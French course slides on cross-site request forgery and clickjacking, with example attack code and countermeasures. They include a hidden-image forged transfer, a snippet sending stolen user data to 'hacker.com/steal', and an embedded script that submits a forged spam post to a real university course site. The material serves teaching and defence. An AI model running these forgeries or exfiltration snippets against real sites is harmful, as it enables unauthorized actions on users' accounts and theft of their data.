---
layout: lesson
title: CSRF
subtitle: Cross Site Request Forgery
scripts: ['http://coffeescript.org/extras/coffee-script.js']
---

<section>

## CSRF : attaques légitimes !

**Cross-Site Request Forgeries** : une faille intrinsèque du Web

### Les acteurs

Un **server** web possédant des **données confidentielles**.

Un **utilisateur légitime authentifié** ayant des **droits sur les
données**.

Un **attaquant** malicieux qui :

- connaît l'API du server (par ex., l'API est publique),
- contrôle un site tiers **sans rapport avec le server victime** (par
  ex., son propre server, ou un site avec une injection XSS).

### Les effets

L'attaquant gagne accès aux données confidentielles avec les droits de
l'utilisateur légitime.

</section>
<section class="compact">

## CSRF : Comment ?

### Pré-requis...

- L'utilisateur est **loggué sur le server** (par ex., il garde un
  onglet ouvert sur une page du server) ;
- L'utilisateur tombe par hasard sur **la page malicieuse de
  l'attaquant**.

### ...et ensuite

- La **page de l'attaquant** déclenche une requête au server

~~~
<html>
...
<h1>Recipe: Panini Reblochon Nutella</h1>
<h2>Ingrédients:</h2>
<ul>
<li>Two slices of bread</li>
...
<img width="0" height="0"
     src="http://server.com/transfer?to=attacker&amount=10k"/>
~~~

- Le browser de l'utilisateur, en voulant télécharger l'image,
déclanche un **transfert d'argent authentifié**.

</section>
<section>

## Démo CSRF : e-campus 2

1. Connectez-vous à <http://e-campus2.uvsq.fr/>,
2. Allez vers la
   [page du cours](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946).
3. Maintenant, supposons que vous visitiez un site au hasard (par ex.,
   ce site !!!), contenant cet `<iframe>` (caché par
   [`display:none`](javascript:){:.hide-frame}):

<iframe id="ecampus" style="width:90%;height:4em;margin:auto;display:block">
</iframe>

<style>
#ecampus.fade-out { opacity: 0 }
#ecampus, #ecampus.fade-out {
    transition: opacity 1s;
    -webkit-transition: opacity 1s;
}
</style>

<script type="text/coffeescript">
form = Element.prototype.append.call $('#ecampus').contentDocument.body, 'form#ecampus-form'
form.method = 'GET'
form.action = 'http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946/cours_plan_form'
form.append = Element.prototype.append.bind(form)

data =
    'typeElement'      : 'TexteLibre',
    'titreElement'     : 'Cheap Viagra',
    'createurElement'  : 'Hacker',
    'form.submitted'   : '1',
    'form.button.save' : 'label_save'

for n, v of data
    i = form.append 'input'
    i.type = 'text'
    i.name = n
    i.value = v

i = form.append 'input'
i.type = 'submit'
i.value = 'Submit'

$('#csrf').onclick = () -> form.submit()

for t in $$('.hide-frame')
    t.onclick = () ->
        $('#ecampus').classList.toggle 'fade-out'
</script>

4. Si vous [cliquez ici](javascript:){:#csrf}, le formulaire est
   soumis, et le CSRF est exécuté.
5. Maintenant rafraîchissez
   [la page du cours](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946)
   et observez le résultat.
{: start="5"}


**Note :** Si le `<iframe>` avait été
  [vraiment caché](javascript:){:.hide-frame}, vous n'auriez rien
  remarqué.

**Note:** Il aurait été possible de tout faire **sans attendre de clic
  de l'utilisateur !**

</section>
<section class="compact">

## AJAX et CSRF : intercepter les données

- À cause de la requête `POST`, l'attaque précédente **n'aurait pas pu
  être menée** uniquement avec `XMLHttpRequest`.
- Mais AJAX offre des nouveaux points d'accès aux CSRF !

Imaginez une **API authentifiée** qui renvoie des requêtes JavaScript :

~~~
HTTP/1.1 200 OK
Content-Type: text/javascript
Access-Control-Allow-Origin: *
...

new UserData(
  "firstName", "Pinco"
  "lastName", Pallino",
  "creditCard", "XXXX XXXX XXXX XXXX",
);
~~~
{:.http}

- Les données sont renvoyées dans un objet `UserData` à `eval`uer.
- La définition de `UserData` est dans les scripts du client.
- Ceci est similaire au paradigme
  [JSONP](http://en.wikipedia.org/wiki/JSONP).

</section>
<section class="compact">

## L'application legitime

1. Le client charge le JavaScript fourni par le server

~~~
<script src="http://www.server.com/js/api.js"></script>
~~~

2. Le script contient la defintion de `UserData`
{: start="2"}

~~~
function Userdata() {
  this.creditCard = ...
}
~~~

3. Le client client fait une requête AJAX à l'API
{: start="3"}

~~~
xhr = new XMLHttpRequest();
xhr.open("GET", "http://api.server.com/getUserData?user=1000");
~~~

4. Le client `eval`ue le JavaScript et traite les données
{: start="4"}

~~~
var data = eval(xhr.response());
var card_number = data[5];
~~~

</section>
<section class="compact">

## L'attaquant

1. Crée une page sur un autre server qu'il contrôle ;
2. Inclue le JavaScript suivant (qui remplace la définition de
   `UserData`)

~~~
function UserData() {
    var img = new Image();
    img.src = "http://hacker.com/steal?" 
              + Array.join(",", arguments);
}
~~~

3. Il force le client à faire une requête à l'API
{: start="3"}

~~~
xhr = new XMLHttpRequest();
xhr.open("GET",
	     "http://api.server.com/getUserData?user=1000");
~~~

4. Le browser envoye les données à `http://hacker.com/steal` (à cause
   de l'`Image()`).
{: start="4"}

</section>
<section>

## CSRF dans la vraie vie

**GMail 2007 rédirection de mail :** des filtres de mails arbitraires
ont pu être configurés via CSRF

- <http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/>
- <http://www.davidairey.com/google-gmail-security-hijack/>

**GMail 2007 vol de contacts :** les attaquants ont pu voler les
carnets d'adresses

- Basé sur JSONP, similaire à l'exemple AJAX + CSRF.
- <http://jeremiahgrossman.blogspot.fr/2007/01/gmail-xsrf-json-call-back-hackery.html>
- <http://jeremiahgrossman.blogspot.fr/2006/01/advanced-web-attack-techniques-using.html>

</section>
<section>

## Contremesures CSRF

### Utilisateur

- Se djélogguer ;
- Utiliser plusieurs browsers.

### Développeur

- Préférer POST à GET pour les requêtes qui déclenchent des actions ;
- Contrôler l'entête `Referer` ;
- Demander confirmation ;
- Faire expirer rapidement les sessions ;
- Utiliser des  captchas ;
- Ajouter des informations reliées à la session dans les URLs ;
- Cacher des jetons aléatoires jetables (**nonces**) dans les
  formulaires.

**Note :** il n'existe pas encore de protection définitive !

</section>
<section>

## Clickjacking et sécurité des Mash-up

Demander confirmation **peut ne pas être suffisant !**

Clickjacking : amener l'utilisateur à cliquer le bouton de
confirmation sans son consentement

- Inclure le formulaire de confirmation dans un `<iframe>` ;
- Utiliser CSS pour superposer le `<iframe>` à du contenu apparemment
  inoffensif ;
- Convaincre l'utilisateur à cliquer sur le contenu inoffensif ;
- Le clic va au `<iframe>` de confirmation.

**(Seule?) utilisation vérifiée :** Twitter 2009 "Don't click this"
<http://dsandler.org/outgoing/dontclick_orig.html>

</section>
<section>

## Clickjacking: Exemple

### [Suivez ce lien](../assets/clickjacking.html)

</section>
<section>

## Contremesures

Entête Expérimentale

~~~
X-Frame-Options: SAMEORIGIN
~~~

- Empêche aux browsers d'inclure la page dans des frames cross-domain ;
- Twitter s'en sert depuis 2009...

</section>
<section>

## Lectures

### Google browser security guide (M. Zalewski)

- <http://code.google.com/p/browsersec/wiki/Part1>,
- <http://code.google.com/p/browsersec/wiki/Part2>.

### Clickjacking

- [`X-Frame-Options`](https://developer.mozilla.org/docs/HTTP/X-Frame-Options),
- [Ajax and Mashup Security](http://www.openajax.org/whitepapers/Ajax and Mashup Security.php#Mashups),
- <https://www.owasp.org/index.php/Clickjacking>.

</section>
